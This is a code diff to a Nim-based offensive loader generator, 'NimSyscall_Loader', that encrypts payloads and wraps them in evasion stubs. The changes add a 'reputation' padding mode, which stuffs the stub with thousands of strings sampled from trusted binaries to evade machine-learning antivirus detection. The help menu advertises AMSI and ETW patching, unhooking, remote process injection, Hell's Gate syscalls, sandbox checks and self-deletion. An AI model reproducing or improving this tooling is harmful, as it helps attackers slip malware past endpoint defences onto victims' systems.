@@ -43,7 +43,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.3_dev                                            
+                                                                 v1.3                                            
 
 """
 
@@ -52,7 +52,7 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.3_dev
+NimSyscall_Loader v 1.3
 
 Usage:
   NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions]
@@ -92,7 +92,7 @@ Options:
                      MemorySpace -> Only execute if more than 4GB RAM available
   --pump value    Pump the file with:
                   words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
-                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome.exe (not ready yet)
+                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
   --domain targetdomain    Specify a domain for SandBox Evasion
   --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
   --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
@@ -142,7 +142,7 @@ var
     pumpfmt: string = ""
     pumpargs: seq[string]
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.3_dev")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.3")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -578,7 +578,38 @@ var {rand2} = {rand1}
 
 """
 
-  return englishwordsstub
+proc genTrustedwords (nuofWords: int): string =
+
+
+  proc pumpTrustedwords (numberofWords: int): seq[string] =
+
+    var trusteddicts: seq[string]
+    var output: seq[string]    
+    var dictionary: string
+    when system.hostOS == "windows":
+        dictionary = "Dicts\\trustedStrings.txt"
+    else:
+        dictionary = "Dicts/trustedStrings.txt"
+    for line in lines dictionary:
+      trusteddicts.add(line)
+    for i in 1 .. numberofWords:
+      output.add(sample(trusteddicts))
+    return output
+
+  proc rndStr: string =
+    for _ in .. 10:
+      add(result, char(rand(int('a') .. int('z'))))
+    
+  var rand1: seq[string] = pumpTrustedwords(nuofWords)
+  var rand2: string = rndStr()
+
+  let trustedwordsstub = fmt"""
+
+var {rand2} = {rand1}
+
+"""
+
+  return trustedwordsstub
 
 var stub = Cryptstub1
 
@@ -588,8 +619,8 @@ if(pump):
     for m in pumpargs:
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
-        if (m == "size"):
-            stub.add("ToDo")
+        if (m == "reputation"):
+            stub.add(genTrustedwords(rand(3500..6200)))
 
 if (selfdelete):
     stub.add(DInvokeSelfDeleteStubs)
